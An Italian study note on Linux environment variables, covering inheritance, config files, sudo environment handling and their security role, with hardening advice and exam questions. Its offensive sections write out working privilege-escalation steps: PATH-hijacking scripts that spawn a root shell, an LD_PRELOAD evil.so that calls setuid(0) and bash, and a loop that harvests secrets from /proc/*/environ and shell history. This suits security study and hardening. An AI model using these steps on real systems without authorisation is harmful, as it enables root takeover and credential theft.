---
tipo: concetto
tag: [linux]
fase: 1
fonti: 5
aggiornato: 2026-06-28
stato: maturo
aliases: ["Variabili d'Ambiente"]
---

# Variabili d'Ambiente

## In breve

Le **variabili d'ambiente** (environment variables) sono coppie `CHIAVE=valore` disponibili per tutti i processi lanciati nella sessione corrente. Costituiscono un canale di configurazione globale: dove cercare gli eseguibili, quale utente è loggato, quale editor usare, quali librerie pre-caricare. Dal punto di vista della sicurezza, alcune variabili — in particolare `PATH`, `LD_PRELOAD` e `LD_LIBRARY_PATH` — sono **vettori diretti di [[Privilege Escalation Linux]]** se non gestite correttamente da programmi privilegiati.

---

## Come funziona il meccanismo

Ogni processo Linux è creato dalla syscall `fork()` + `execve()`. Il processo figlio **eredita una copia** dell'environment del padre: modifiche nel figlio non risalgono al padre. Questo spiega perché `export` in una subshell non modifica la shell corrente.

```
init (PID 1)
  └── bash (PID 1001)  — environment: PATH, HOME, USER, ...
        └── ls    (fork/exec)  — copia dell'environment di bash
        └── vim   (fork/exec)  — copia dell'environment di bash
```

**Variabile locale vs esportata:**
```bash
NOME="valore"         # locale: solo nella shell corrente, NON ereditata dai figli
export NOME="valore"  # esportata: i processi figli la ricevono
```

**Vedere l'environment:**
```bash
env               # tutte le variabili esportate del processo corrente
printenv          # equivalente
printenv PATH     # solo una variabile
echo $PATH        # espansione in shell
set               # anche variabili locali e funzioni (bash)
cat /proc/$$/environ | tr '\0' '\n'   # environment raw del processo corrente
cat /proc/<PID>/environ | tr '\0' '\n'  # environment di un processo arbitrario
```

---

## Variabili più importanti

### Variabili di sistema fondamentali

| Variabile | Significato | Esempio |
|-----------|-------------|---------|
| `PATH` | Lista di directory (`:` separata) dove la shell cerca gli eseguibili | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` |
| `HOME` | Home directory dell'utente corrente | `/home/mario` |
| `USER` / `LOGNAME` | Nome dell'utente corrente | `mario` |
| `SHELL` | Percorso della shell di login | `/bin/bash` |
| `PWD` | Directory di lavoro corrente | `/home/mario/projects` |
| `OLDPWD` | Directory precedente (usata da `cd -`) | `/tmp` |
| `TERM` | Tipo di terminale | `xterm-256color` |
| `LANG` / `LC_*` | Locale (lingua, charset) | `it_IT.UTF-8` |
| `PS1` | Aspetto del prompt | `\u@\h:\w\$ ` |
| `EDITOR` / `VISUAL` | Editor di default per crontab, git commit, ecc. | `/usr/bin/vim` |
| `HISTFILE` | File di storia dei comandi | `~/.bash_history` |
| `HISTSIZE` | Numero di comandi tenuti in memoria | `1000` |

### Variabili del dynamic linker (critiche per sicurezza)

| Variabile | Effetto |
|-----------|---------|
| `LD_PRELOAD` | Carica la/le librerie `.so` indicate **prima di qualsiasi altra**, per ogni eseguibile che le eredita |
| `LD_LIBRARY_PATH` | Aggiunge directory in testa al path di ricerca delle librerie condivise |
| `LD_AUDIT` | Carica un audit module per ogni exec (audit di linking) |
| `LD_DEBUG` | Output di debug del linker (`LD_DEBUG=all ls`) |

> [!warning] Sicurezza del dynamic linker
> Il loader `ld.so` **ignora** `LD_PRELOAD`, `LD_LIBRARY_PATH` e variabili simili quando l'eseguibile ha SUID/SGID o capabilities elevate (EUID ≠ UID). Questo è il comportamento sicuro di default. Il vettore LD_PRELOAD funziona **solo se sudo conserva la variabile** (`env_keep += LD_PRELOAD` in sudoers) — il che è una misconfiguration.

---

## File di configurazione: dove vivono le variabili

```
Login shell (ssh, tty login):
  /etc/environment       → variabili di sistema (senza export, solo KEY=value)
  /etc/profile           → script globale (eseguito per tutti gli utenti)
  /etc/profile.d/*.sh    → script modulari (un file per tool: nvm, java, ecc.)
  ~/.bash_profile        → specifico utente (bash login shell)
  ~/.profile             → specifico utente (POSIX, usato da sh e altri)
  ~/.bashrc              → bash non-login shell (aperta da terminale GUI)

Non-login shell (terminale grafico, su -):
  ~/.bashrc              → specifico utente

Ordine di caricamento bash (login):
  /etc/profile → /etc/profile.d/*.sh → ~/.bash_profile → ~/.bashrc
```

**Pratica:**
```bash
# Variabile permanente per un solo utente
echo 'export JAVA_HOME=/usr/lib/jvm/java-17' >> ~/.bashrc
source ~/.bashrc        # ricarica senza aprire nuova shell

# Variabile di sistema per tutti gli utenti
echo 'JAVA_HOME=/usr/lib/jvm/java-17' >> /etc/environment
# oppure
echo 'export JAVA_HOME=/usr/lib/jvm/java-17' > /etc/profile.d/java.sh
```

---

## PATH: il vettore più importante

### Come funziona la risoluzione dei comandi

Quando digiti `ls`, bash cerca da sinistra a destra in ogni directory di `PATH` fino a trovare un file eseguibile con quel nome. Il primo match vince.

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

which ls       # /bin/ls  — risolve il percorso
type ls        # ls is /bin/ls
type cd        # cd is a shell builtin (non tocca PATH)
```

### PATH hijacking — tecnica offensiva

Se un programma privilegiato (SUID, cron root, sudo) chiama un comando **senza path assoluto**, l'attaccante può mettere un eseguibile malevolo con lo stesso nome in una directory che precede `/usr/bin` nel PATH.

**Scenario classico — binary SUID custom:**
```c
// vulnerable.c — binario SUID-root che chiama "service" senza path assoluto
#include <stdlib.h>
int main() { system("service apache2 start"); return 0; }
```

```bash
# Sfruttamento
cd /tmp
echo '#!/bin/bash' > service
echo '/bin/bash -p' >> service
chmod +x service
export PATH=/tmp:$PATH
/path/to/vulnerable_suid      # esegue /tmp/service come root → shell EUID=0
```

**Scenario cron — script senza path assoluto:**
```bash
# /etc/crontab: * * * * * root /opt/scripts/backup.sh
# /opt/scripts/backup.sh contiene: ps aux > /tmp/backup.txt  (ps senza path assoluto)
cd /tmp
echo '#!/bin/bash' > ps
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> ps
chmod +x ps
# Se il cron esegue backup.sh con PATH che include /tmp → exploit
```

**Individuare PATH hijacking in programmi SUID:**
```bash
strings /path/to/suid_binary | grep -E '^[a-z]+$'  # comandi senza path assoluto
ltrace /path/to/suid_binary 2>&1 | grep exec        # trace delle syscall exec
strace -e execve /path/to/suid_binary 2>&1          # exec al livello kernel
```

---

## LD_PRELOAD: iniezione di librerie

### Meccanismo legittimo

`LD_PRELOAD` consente di caricare una libreria condivisa **prima di tutte le altre**, inclusa la libc. Funzioni con lo stesso nome di quelle di sistema vengono **intercettate** (override). Usi legittimi: debugging, monkey-patching, `faketime`, `jemalloc`.

```bash
# Esempio legittimo: override di malloc con jemalloc
LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2 ./myapp
```

### LD_PRELOAD come vettore di privesc

**Condizione necessaria**: `sudo -l` mostra `env_keep += LD_PRELOAD` (la variabile sopravvive a sudo) **e** hai un comando sudo da eseguire.

```bash
sudo -l
# Matching Defaults entries:
#   env_keep += LD_PRELOAD
# User mario may run the following commands:
#   (root) NOPASSWD: /usr/bin/find
```

**Exploit:**
```c
// evil.c — libreria malevola
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");   // evita loop ricorsivi
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find   # → bash root
```

**Perché funziona?** `_init()` viene eseguita **prima di `main()`** all'avvio di qualsiasi processo che carica la libreria. Il processo ha già EUID=0 (perché avviato da sudo) quando chiama `setuid(0)` → nessun check fallisce.

### LD_LIBRARY_PATH hijacking

Simile a PATH hijacking ma per le librerie. Se un SUID cerca `libfoo.so` e `LD_LIBRARY_PATH` punta a una directory controllata da te (o se la directory standard `/usr/lib/foo/` è scrivibile), puoi sostituire la libreria.

```bash
# Trova quali librerie carica un binario
ldd /path/to/suid_binary
# linux-vdso.so.1 (...)
# libcustom.so => not found    ← libreria mancante = exploit

# Se 'not found': crea la libreria nella directory corrente o in LD_LIBRARY_PATH
# (ricorda: ld.so ignora LD_LIBRARY_PATH per SUID, ma non per sudo con env_keep)
```

---

## Secrets nelle variabili d'ambiente

Le variabili d'ambiente sono spesso usate per passare credenziali agli applicativi (pattern comune in Docker, CI/CD, cloud):

```bash
export DATABASE_URL="postgresql://user:password@db:5432/mydb"
export API_KEY="sk-abc123..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtn..."
```

**Rischio**: questi valori sono visibili a **tutti i processi dello stesso utente** tramite `/proc/<PID>/environ`, e possono finire in log, core dump, output di debug.

```bash
# Pentest: cerca secrets nelle variabili d'ambiente dei processi in esecuzione
for pid in /proc/[0-9]*/environ; do
    echo "=== $pid ==="; cat $pid 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|token|secret|api'
done

# Guarda history per comandi con credenziali inline
cat ~/.bash_history | grep -iE 'pass|key|token|secret'

# File di configurazione e script con credenziali hardcoded
grep -r -i "password\|api_key\|token\|secret" /home/ /opt/ /var/www/ 2>/dev/null
```

**Hardening**:
- Non usare variabili d'ambiente per segreti in produzione: preferire **vault** (HashiCorp Vault, AWS Secrets Manager) o file con permessi `600`.
- In Docker: non passare secrets via `-e` nell'image layer; usare Docker secrets o `.env` non committato.
- Pulire `HISTFILE` / settare `HISTCONTROL=ignorespace` (comandi preceduti da spazio non vanno in history).

---

## sudo e la pulizia dell'environment

`sudo` di default **resetta l'environment** del processo figlio a un ambiente minimale e sicuro. Le variabili pericolose (`LD_PRELOAD`, `LD_LIBRARY_PATH`) vengono rimosse anche se presenti.

```bash
# /etc/sudoers — configurazioni pericolose
Defaults env_keep += "LD_PRELOAD"           # mantiene LD_PRELOAD → exploit
Defaults env_keep += "LD_LIBRARY_PATH"      # mantiene LD_LIBRARY_PATH → exploit
Defaults !env_reset                          # disabilita il reset → tutto passa

# Configurazione sicura (default)
Defaults env_reset
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

Il `secure_path` imposta un PATH fisso per i comandi eseguiti via sudo, bloccando il PATH hijacking.

---

## Sicurezza: riepilogo offensivo vs hardening

| Vettore | Condizione | Tecnica |
|---------|-----------|---------|
| PATH hijacking | Programma SUID/cron chiama cmd senza path assoluto | Inserisci `/tmp` in testa al PATH, crea il fake cmd |
| LD_PRELOAD | `env_keep += LD_PRELOAD` in sudoers | Compila evil.so con `_init()`, lancia via sudo |
| LD_LIBRARY_PATH | `env_keep += LD_LIBRARY_PATH` + lib cercata in dir scrivibile | Crea libreria fake nella dir |
| Secrets in env | Credenziali in variabili d'ambiente | `/proc/<PID>/environ` o grep di history/config |

| Hardening | Dettaglio |
|-----------|-----------|
| `env_reset` in sudoers (default) | Non disabilitarlo mai |
| `secure_path` in sudoers | PATH fisso e sicuro per sudo |
| Path assoluti negli script privilegiati | Blocca PATH hijacking alla radice |
| Niente secrets in variabili d'ambiente in prod | Usa vault o file `600` |
| Audit `/proc/<PID>/environ` se disponibile | Logging anomalie tramite auditd |

---

## Troubleshooting

| Sintomo | Causa | Soluzione |
|---------|-------|-----------|
| Comando non trovato dopo installazione | Directory non in `PATH` | `export PATH=$PATH:/nuovo/path`; poi aggiungi a `~/.bashrc` |
| Variabile esportata non visibile nel figlio | Non è stata esportata (`export` mancante) | `export VAR=valore` |
| Modifica a `.bashrc` non attiva | File non ricaricato | `source ~/.bashrc` oppure apri nuova shell |
| `sudo` non vede le variabili che hai settato | `env_reset` in sudoers (comportamento corretto) | Passa la variabile esplicitamente: `sudo VAR=x cmd` oppure `sudo -E cmd` (con cautela) |
| `LD_PRELOAD` non funziona su binario SUID | `ld.so` lo ignora per sicurezza | Comportamento corretto; serve la misconfiguration `env_keep` in sudoers |
| `echo $PATH` mostra path corretto ma `which cmd` fallisce | Binario non eseguibile (`chmod +x` mancante) | `chmod +x /path/cmd` |

---

## Lab

- **TryHackMe — Linux PrivEsc**: sezioni dedicate a PATH hijacking e `LD_PRELOAD` con `sudo env_keep`.
- **HackTheBox Academy — Linux Privilege Escalation**: modulo con esercizi su variabili d'ambiente e abuso del dynamic linker.
- **OverTheWire — Bandit** (livelli con PATH e variabili manipolate): pratica risoluzione comandi e `$PATH`.

## Domande da esame / colloquio

> **D: Qual è la differenza tra una variabile locale e una variabile esportata in bash?**
> Una variabile locale (`VAR=valore`) esiste solo nella shell corrente e non viene trasmessa ai processi figli. Una variabile esportata (`export VAR=valore`) viene inserita nell'environment passato ai figli tramite `execve()`. I figli ne ricevono una **copia**: modifiche nel figlio non risalgono al padre.

> **D: Perché `LD_PRELOAD` non funziona per fare privesc su un binario SUID direttamente?**
> Il dynamic linker `ld.so` controlla se `EUID != UID` (o `EGID != GID`): se il bit SUID è attivo, il processo parte con EUID = owner del file ma UID = utente normale. In questa condizione, `ld.so` ignora `LD_PRELOAD`, `LD_LIBRARY_PATH` e tutte le variabili di ambiente che potrebbero alterare il linking. Il vettore funziona solo se sudo è mal configurato con `env_keep += LD_PRELOAD`.

> **D: Cos'è `secure_path` in sudoers e perché è importante?**
> È un PATH fisso e sicuro impostato da sudo prima di eseguire il comando. Bypassa completamente il `PATH` dell'utente, rendendo impossibile il PATH hijacking via sudo anche se l'utente ha modificato la propria variabile. È una delle difese più semplici ed efficaci contro questo vettore.

> **D: Come trovi credenziali esposte tramite variabili d'ambiente su un sistema compromesso?**
> Iteri su `/proc/[0-9]*/environ` leggendo l'environment di ogni processo in esecuzione (leggibili se appartengono al tuo utente o sei root), e applichi grep per pattern come `password`, `key`, `token`, `secret`. Cerchi anche in `~/.bash_history`, file `.env`, script di startup e configurazioni di servizi.

> **D: Differenza tra `/etc/environment` e `/etc/profile`?**
> `/etc/environment` è un file **non-shell** (non viene "sourciato" da bash): accetta solo `KEY=value` senza `export` e senza espansioni. Viene letto da PAM (`pam_env`) e si applica a tutti i login. `/etc/profile` è uno **script bash** eseguito solo per le login shell, supporta `export`, condizioni, funzioni e logica complessa. Utile se devi impostare variabili basate su condizioni o eseguire comandi all'avvio.

> **D: In un pentest, hai una shell come `www-data` e trovi `env_keep += LD_PRELOAD` in sudoers con un comando sudo NOPASSWD. Descrivi l'exploit passo-passo.**
> 1. Scrivi `evil.c` con funzione `_init()` che chiama `setuid(0)` e `system("/bin/bash")`. 2. Compila con `gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c`. 3. Esegui `sudo LD_PRELOAD=/tmp/evil.so <comando_permesso>`. 4. `ld.so` carica `evil.so` prima di tutto: `_init()` gira con EUID=0 perché il processo è già root (avviato da sudo), chiama `setuid(0)` definitivamente e lancia bash. Risultato: shell root interattiva.

---

## Collegamenti

- [[Bash Scripting]]
- [[Privilege Escalation Linux]]
- [[sudo]]
- [[Processi Linux]]
- [[Permessi Linux]]
- [[SUID e SGID]]
- [[Cron e Job Pianificati]]

## Fonti

- GNU Bash Reference – Environment: https://www.gnu.org/software/bash/manual/bash.html#Environment
- Man page environ(7): https://man7.org/linux/man-pages/man7/environ.7.html
- Man page ld.so(8): https://man7.org/linux/man-pages/man8/ld.so.8.html
- HackTricks – LD_PRELOAD Privilege Escalation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path
- HackTricks – PATH Hijacking: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path
